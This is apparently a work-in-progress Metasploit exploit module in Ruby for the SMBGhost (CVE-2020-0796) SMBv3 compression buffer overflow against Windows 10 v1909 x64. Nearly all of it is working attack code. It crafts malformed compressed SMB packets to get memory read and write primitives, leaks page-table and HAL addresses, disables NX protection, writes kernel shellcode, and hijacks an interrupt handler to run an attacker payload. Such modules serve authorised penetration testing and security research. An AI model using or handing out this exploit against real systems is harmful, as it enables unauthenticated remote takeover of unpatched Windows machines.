##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'ruby_smb'
require 'ruby_smb/smb1/packet'
require 'windows_error'

class MetasploitModule < Msf::Exploit::Remote
  Rank = AverageRanking

  include Msf::Exploit::Remote::DCERPC
  # include Msf::Exploit::Remote::CheckModule
  # prepend Msf::Exploit::Remote::AutoCheck

  LZNT1 = RubySMB::Compression::LZNT1

  # todo: move this into a proper target
  OVERFLOW_VAL = 0x1100
  LOWSTUB_JMP = 0x1000600e9
  PML4_LOWSTUB_OFFSET = 0xa0
  SELFVA_LOWSTUB_OFFSET = 0x78
  HALP_APIC_REQ_INTERRUPT_OFFSET = 0x78

  KUSER_SHARED_DATA = 0xFFFFF78000000000
  PMDL_VA = KUSER_SHARED_DATA + 0x900
  PMDL_MAPVA = KUSER_SHARED_DATA + 0x800
  PMDL1_OFFSET = 0x38
  PNET_RAW_BUFF_OFFSET = 0x18
  PSHELLCODEVA = KUSER_SHARED_DATA + 0x950

  MAX_READ_RETRIES = 5
  WRITE_UNIT = 0xd0

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'SMBv3 Compression Buffer Overflow',
        'Description' => %q{
        },

        'Author' =>
        [

        ],
        'License' => MSF_LICENSE,
        'References' =>
          [
            [ 'URL', 'https://ricercasecurity.blogspot.com/2020/04/ill-ask-your-body-smbghost-pre-auth-rce.html' ],
            [ 'URL', 'https://github.com/chompie1337/SMBGhost_RCE_PoC' ],
            [ 'URL', 'https://www.youtube.com/watch?v=RSV3f6aEJFY&t=1865s' ],
          ],
        'DefaultOptions' =>
          {
            'EXITFUNC' => 'thread',
            'WfsDelay' => 5
          },
        'Privileged' => true,
        'Payload' =>
          {
            'Space' => 512, # this can be more, needs to be recalculated
            'DisableNops' => false
          },
        'Platform' => 'win',
        'Targets' =>
          [
            [
              'Windows 10 v1909 x64',
              {
                'Platform' => 'win',
                'Arch' => [ARCH_X64]
              }
            ]
          ],
        'DefaultTarget' => 0,
        'DisclosureDate' => '2021-03-12',
        'Notes' =>
          {
            'AKA' => ['']
          }
      )
    )

    register_options(
      [
        Opt::RPORT(445),
        # OptBool.new('VERIFY_TARGET', [true, 'Check if remote OS matches exploit Target.', true]),
        # OptBool.new('VERIFY_ARCH', [true, 'Check if remote architecture matches exploit Target.', true]),
        # OptString.new('SMBUser', [false, '(Optional) The username to authenticate as', '']),
        # OptString.new('SMBPass', [false, '(Optional) The password for the specified username', '']),
        # OptString.new('SMBDomain', [false, '(Optional) The Windows domain to use for authentication', '.'])
      ]
    )
    register_advanced_options(
      [
        OptString.new('FastForwardToken', [false, 'Fast forward token', '']),
        # OptInt.new('MaxExploitAttempts', [true, 'The number of times to retry the exploit.', 3]),
        # OptInt.new('GroomAllocations', [true, 'Initial number of times to groom the kernel pool.', 12]),
        # OptInt.new('GroomDelta', [true, 'The amount to increase the groom count by per try.', 5])
      ]
    )

  end

  def smb_negotiate
    # need a custom negotiate function because the responses may be corrupt while reading memory
    sock = connect(false)
    dispatcher = RubySMB::Dispatcher::Socket.new(sock)

    packet = RubySMB::SMB2::Packet::NegotiateRequest.new
    packet.client_guid = SecureRandom.random_bytes(16)
    packet.set_dialects((RubySMB::Client::SMB2_DIALECT_DEFAULT + RubySMB::Client::SMB3_DIALECT_DEFAULT).map { |d| d.to_i(16) })

    packet.capabilities.large_mtu = 1
    packet.capabilities.encryption = 1

    nc = RubySMB::SMB2::NegotiateContext.new(
      context_type: RubySMB::SMB2::NegotiateContext::SMB2_PREAUTH_INTEGRITY_CAPABILITIES
    )
    nc.data.hash_algorithms << RubySMB::SMB2::PreauthIntegrityCapabilities::SHA_512
    nc.data.salt = "\x00" * 32
    packet.add_negotiate_context(nc)

    nc = RubySMB::SMB2::NegotiateContext.new(
      context_type: RubySMB::SMB2::NegotiateContext::SMB2_COMPRESSION_CAPABILITIES
    )
    nc.data.flags = 1
    nc.data.compression_algorithms << RubySMB::SMB2::CompressionCapabilities::LZNT1
    packet.add_negotiate_context(nc)

    dispatcher.send_packet(packet)
    dispatcher
  end

  def write_primitive(data, addr)
    dispatcher = smb_negotiate
    dispatcher.tcp_socket.get_once  # disregard the response

    uncompressed_data = rand(0x41..0x5a).chr * (OVERFLOW_VAL - data.length)
    uncompressed_data << "\x00" * PNET_RAW_BUFF_OFFSET
    uncompressed_data << [ addr ].pack('Q<')

    pkt = RubySMB::SMB2::Packet::CompressionTransformHeader.new(
      original_compressed_segment_size: 0xffffffff,
      compression_algorithm: RubySMB::SMB2::CompressionCapabilities::LZNT1,
      offset: data.length,
      compressed_data: (data + LZNT1.compress(uncompressed_data)).bytes
    )
    dispatcher.send_packet(pkt)
    dispatcher.tcp_socket.close
  end

  def write_srvnet_buffer_hdr(data, offset)
    dispatcher = smb_negotiate
    dispatcher.tcp_socket.get_once  # disregard the response

    dummy_data = rand(0x41..0x5a).chr * (OVERFLOW_VAL + offset)
    pkt = RubySMB::SMB2::Packet::CompressionTransformHeader.new(
      original_compressed_segment_size: 0xffffefff,
      compression_algorithm: RubySMB::SMB2::CompressionCapabilities::LZNT1,
      offset: dummy_data.length,
      compressed_data: (dummy_data + CorruptLZNT1.compress(data)).bytes
    )
    dispatcher.send_packet(pkt)
    dispatcher.tcp_socket.close
  end

  def read_primitive(phys_addr)
    value = @read_cache[phys_addr]
    return value unless value.nil?

    vprint_status("Reading from physical memory at index: #{phys_addr.to_s(16).rjust(16, '0')}")
    fake_mdl = MDL.new(
      mdl_size: 0x48,
      mdl_flags: 0x5018,
      mapped_system_va: PMDL_MAPVA,
      start_va: (PMDL_MAPVA & ~0xfff),
      byte_count: 600,
      byte_offset: ((phys_addr & 0xfff) + 0x4)
    )
    phys_addr_enc = (phys_addr & 0xfffffffffffff000) >> 12

    (MAX_READ_RETRIES * 2).times do |try|
      write_primitive(fake_mdl.to_binary_s + ([ phys_addr_enc ] * 3).pack('Q<*'), PMDL_VA)
      write_srvnet_buffer_hdr([PMDL_VA].pack('Q<'), PMDL1_OFFSET)

      MAX_READ_RETRIES.times do |_|
        dispatcher = smb_negotiate
        blob = dispatcher.tcp_socket.get_once
        dispatcher.tcp_socket.close
        next '' if blob.nil?
        next if blob[4..7] == "\xfeSMB".b
        @read_cache[phys_addr] = blob
        return blob
      end
      sleep try ** 2
    end

    fail_with(Failure::Unknown, 'failed to read physical memory')
  end

  def find_low_stub
    (0x13000..0x100000).step(0x1000) do |index|
      buff = read_primitive(index)
      entry = buff.unpack('Q<').first
      next unless (entry & 0xffffffffffff00ff) == LOWSTUB_JMP

      print_status("Found low stub at physical address 0x#{index.to_s(16).rjust(16, '0')}")
      pml4 = buff[PML4_LOWSTUB_OFFSET...(PML4_LOWSTUB_OFFSET + 8)].unpack('Q<').first
      print_status("PML4 at 0x#{pml4.to_s(16).rjust(16, '0')} " + {0x1aa000 => '(BIOS)', 0x1ad000 => '(UEFI)'}.fetch(pml4, ''))

      phal_heap = buff[SELFVA_LOWSTUB_OFFSET...(SELFVA_LOWSTUB_OFFSET + 8)].unpack('Q<').first
      phal_heap &= 0xfffffffff0000000
      print_status("HAL heap found at 0x#{phal_heap.to_s(16).rjust(16, '0')}")

      return { pml4: pml4, phal_heap: phal_heap }
    end

    fail_with(Failure::Unknown, 'failed to leak the PML4 address')
  end

  def find_pml4_selfref(pointers)
    search_len = 0x1000
    index = pointers[:pml4]

    while search_len > 0
      buff = read_primitive(index)
      buff = buff[0...-(buff.length % 8)]
      buff.unpack('Q<*').each_with_index do |entry, i|
        entry &= 0xfffff000
        next unless entry == pointers[:pml4]

        selfref = ((index + (i * 8)) & 0xfff) >> 3
        pointers[:pml4_selfref] = selfref
        print_status("Found PML4 self-reference entry 0x#{selfref.to_s(16).rjust(16, '0')}")
        return pointers
      end
      search_len -= [buff.length, 8].max
      index += [buff.length, 8].max
    end

    fail_with(Failure::Unknown, 'failed to leak the PML4 self reference')
  end

  def get_phys_addr(pointers, va_addr)
    pml4_index = (((1 << 9) - 1) & (va_addr >> (40 - 1)))
    pdpt_index = (((1 << 9) - 1) & (va_addr >> (31 - 1)))
    pdt_index = (((1 << 9) - 1) & (va_addr >> (22 - 1)))
    pt_index = (((1 << 9) - 1) & (va_addr >> (13 - 1)))

    pml4e = pointers[:pml4] + pml4_index * 8
    pdpt_buff = read_primitive(pml4e)

    pdpt = pdpt_buff.unpack('Q<').first & 0xfffff000
    pdpte = pdpt + pdpt_index * 8
    pdt_buff = read_primitive(pdpte)

    pdt = pdt_buff.unpack('Q<').first & 0xfffff000
    pdte = pdt + pdt_index * 8
    pt_buff = read_primitive(pdte)

    pt = pt_buff.unpack('Q<').first
    unless pt & (1 << 7) == 0
      return (pt & 0xfffff000) + (pt_index & 0xfff) * 0x1000 + (va_addr & 0xfff)
    end

    pt &= 0xfffff000
    pte = pt + pt_index * 8
    pte_buff = read_primitive(pte)
    (pte_buff.unpack('Q<').first & 0xfffff000) + (va_addr & 0xfff)
  end

  def disable_nx(pointers, addr)
    pt = addr >> 9
    lb = (0xffff << 48) | (pointers[:pml4_selfref] << 39)
    ub = ((0xffff << 48) | (pointers[:pml4_selfref] << 39) + 0x8000000000 - 1) & 0xfffffffffffffff8
    pt = pt | lb
    pte_va = pt & ub

    phys_addr = get_phys_addr(pointers, pte_va)
    buff = read_primitive(phys_addr)
    overwrite_val = buff.unpack('Q<').first & ((1 << 63) - 1)
    write_primitive([ overwrite_val ].pack('Q<'), pte_va)
  end

  def search_hal_heap(pointers)
    va_cursor = pointers[:phal_heap]
    end_va = va_cursor + 0x2000

    while va_cursor < end_va
      phys_addr = get_phys_addr(pointers, va_cursor)
      buff = read_primitive(phys_addr)
      buff = buff[0...-(buff.length % 8)]
      values = buff.unpack('Q<*')
      window_size = 8  # using a sliding window to fingerprint the memory
      0.upto(values.length - window_size) do |i|  # todo: if the heap structure exists over two pages, this will break
        va = va_cursor + (i * 8)
        window = values[i...(i + window_size)]
        next unless window[4...8].all? { |value| value & 0xffffff0000000000 == 0xfffff80000000000 }
        next unless window[0...3].all? { |value| value & 0xfffff00000000000 == 0xfffff00000000000 }
        next unless window[3].between?(0x20, 0x40)
        next unless (window[0] - window[2]).between?(0x80, 0x180)

        phalp_apic_interrupt = read_primitive(get_phys_addr(pointers, va) + HALP_APIC_REQ_INTERRUPT_OFFSET).unpack('Q<').first
        next if read_primitive(get_phys_addr(pointers, phalp_apic_interrupt))[0...8] != "\x48\x89\x6c\x24\x20\x56\x41\x54"

        # looks legit (TM), lets hope for the best
        # use WinDBG to validate the hal!HalpInterruptController value manually
        # 0: kd> dq poi(hal!HalpInterruptController) L1
        pointers[:phalp_interrupt] = va
        print_status("Found hal!HalpInterruptController at 0x#{va.to_s(16).rjust(16, '0')}")

        # use WinDBG to validate the hal!HalpApicRequestInterrupt value manually
        # 0: kd> dq u poi(poi(hal!HalpInterruptController)+78) L1
        pointers[:phalp_apic_interrupt] = phalp_apic_interrupt
        print_status("Found hal!HalpApicRequestInterrupt at 0x#{phalp_apic_interrupt.to_s(16).rjust(16, '0')}")
        return pointers
      end

      va_cursor += buff.length
    end
    fail_with(Failure::Unknown, 'failed to leak the necessary addresses')
  end

  def build_shellcode(pointers)
    source = File.read(File.join(Msf::Config.install_root, 'external', 'source', 'exploits', 'CVE-2020-0796', 'RCE','kernel_shellcode.asm'))
    edata = Metasm::Shellcode.assemble(Metasm::X64.new, source).encoded
    user_shellcode = payload.encoded
    edata.fixup 'PHALP_APIC_REQUEST_INTERRUPT' => pointers[:phalp_apic_interrupt]
    edata.fixup 'PPHALP_APIC_REQUEST_INTERRUPT' => pointers[:phalp_interrupt] + HALP_APIC_REQ_INTERRUPT_OFFSET
    edata.fixup 'USER_SHELLCODE_SIZE' => user_shellcode.length
    edata.data + user_shellcode
  end

  def exploit
    @read_cache = {}
    pointers = find_low_stub
    pointers = find_pml4_selfref(pointers)
    pointers = search_hal_heap(pointers)
    disable_nx(pointers, KUSER_SHARED_DATA)
    print_status('KUSER_SHARED_DATA PTE NX bit cleared!')
    #pointers = { phalp_interrupt: 0xfffff7f300000688, phalp_apic_interrupt: 0xfffff80151f5ebb0 }

    shellcode = build_shellcode(pointers)
    vprint_status("Transferring #{shellcode.length} bytes of shellcode...")
    to_write = shellcode.length
    write_bytes = 0
    while write_bytes < to_write
      write_sz = [WRITE_UNIT, to_write - write_bytes].min
      write_primitive(shellcode[write_bytes...(write_bytes + write_sz)], PSHELLCODEVA + write_bytes)
      write_bytes += write_sz
    end
    vprint_status('Transfer complete.')

    write_primitive([PSHELLCODEVA].pack('Q<'), pointers[:phalp_interrupt] + HALP_APIC_REQ_INTERRUPT_OFFSET)
  end

  module CorruptLZNT1
    def self.compress(buf, chunk_size: 0x1000)
      out = ''
      until buf.empty?
        chunk = buf[0...chunk_size]
        compressed = LZNT1::compress_chunk(chunk)

        # always use the compressed chunk, even if it's larger
        out << [ 0xb000 | (compressed.length - 1) ].pack('v')
        out << compressed

        buf = buf[chunk_size..-1]
        break if buf.nil?
      end

      out << [ 0x1337 ].pack('v')
      out
    end
  end

  class MDL < BinData::Record
    # https://www.vergiliusproject.com/kernels/x64/Windows%2010%20%7C%202016/1909%2019H2%20(November%202019%20Update)/_MDL
    endian :little
    uint64 :next_mdl
    uint16 :mdl_size
    uint16 :mdl_flags
    uint16 :allocation_processor_number
    uint16 :reserved
    uint64 :process
    uint64 :mapped_system_va
    uint64 :start_va
    uint32 :byte_count
    uint32 :byte_offset
  end
end
